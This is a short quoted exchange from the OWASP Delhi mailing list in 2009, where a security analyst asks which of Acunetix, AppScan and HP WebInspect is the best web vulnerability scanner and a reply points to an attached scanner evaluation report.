+> Sent: Sunday, March 29, 2009 5:17 PM
+> To: Parmendra Sharma
+> Cc: owasp-delhi at lists.owasp.org
+> Subject: Re: [Owasp-delhi] Tools Comparison
+>
+> some times back a report on "Web Vulnerability Scanners Evaluation"
+> was published and notification for the same was
+> posted on securityfocus mailing list.
+>
+> the report is attached with this email.
+>
+> hope that would help u
+>
+> regards
+> abhi
+>
+> 2009/3/28 Parmendra Sharma <s.parmendra at gmail.com>:
+>> Dear All,
+>>
+>> Kindly?give some idea that which tool is best among Acunetix, Appscan and
+> HP
+>> Webinspect.
+>>
+>> --
+>> Thanks and Regards:
+>>
+>> Parmendra Sharma
+>> Computer Security Analyst
+>>
+>> _______________________________________________
+>> Owasp-delhi mailing list
+>> Owasp-delhi at lists.owasp.org
+>> https://lists.owasp.org/mailman/listinfo/owasp-delhi
+>>
+>>
+>
+>
+
